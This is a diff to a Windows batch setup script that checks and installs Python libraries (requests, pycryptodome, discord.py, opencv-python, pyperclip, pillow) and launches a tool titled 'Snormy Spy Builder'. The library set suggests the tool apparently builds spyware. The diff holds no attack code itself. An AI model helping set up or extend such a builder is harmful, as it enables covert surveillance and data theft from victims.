@@ -17,14 +17,12 @@ python -m pip install --upgrade pip --quiet
 title Downloading libraries...
 
 for %%A in (
-    "customtkinter"
-    "pillow"
-    "pyaes"
-    "urllib3"
+    "requests"
     "pycryptodome"
     "discord.py"
     "opencv-python"
     "pyperclip"
+    "pillow"
 ) do (
     echo Checking %%~A...
     python -c "import %%~A" >nul 2>&1
@@ -35,7 +33,7 @@ for %%A in (
 )
 
 cls
-title Snorm Spy Builder
+title Snormy Spy Builder
 python setup.py
 if %errorlevel% neq 0 goto ERROR
 exit
@@ -43,6 +41,6 @@ exit
 :ERROR
 color 4
 title [Error]
-echo An error occurred while opening
+echo An error occurred.
 pause
 exit
